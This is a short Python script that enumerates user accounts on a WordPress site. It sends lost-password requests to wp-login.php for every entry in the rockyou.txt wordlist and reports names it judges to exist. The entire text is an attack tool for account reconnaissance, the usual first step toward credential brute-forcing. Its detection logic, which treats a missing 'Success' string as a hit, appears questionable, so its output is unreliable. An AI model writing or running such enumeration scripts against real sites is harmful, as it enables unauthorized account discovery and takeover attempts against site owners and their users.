import requests

# URL of the target WordPress site's
TARGET_SITE = "http://targetwordpresssite.com"

url = f'{TARGET_SITE}/wp-login.php?action=lostpassword'

# Read the rockyou.txt file
with open('rockyou.txt', 'r') as file:
    usernames = file.readlines()

# Try each username
for username in usernames:
    username = username.strip()

    payload = {
        'user_login': username,
        'redirect_to': '',
        'wp-submit': 'Get New Password'
    }

    # Send a POST request
    response = requests.post(url, data=payload)

    # Check if the username exists
    if 'Success' not in response.text:
        print(f'The username {username} exists.')
